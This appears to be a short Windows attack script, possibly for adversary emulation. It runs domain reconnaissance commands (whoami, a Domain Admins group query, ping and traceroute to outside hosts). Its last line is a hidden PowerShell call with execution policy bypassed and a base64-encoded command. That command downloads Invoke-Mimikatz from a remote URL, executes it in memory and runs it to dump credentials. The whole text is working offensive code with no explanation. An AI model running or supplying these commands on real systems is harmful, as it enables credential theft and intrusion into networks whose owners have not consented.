cmd.exe /c "whoami"
Start-Sleep -s 2
cmd.exe /c "ping -n 1 8.8.8.8"
Start-Sleep -s 2
cmd.exe /c "net group "Domain Admins" /domain
Start-Sleep -s 2
cmd.exe /c "tracert -d nasa.xxuz.com"
Start-Sleep -s 2
cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA=="
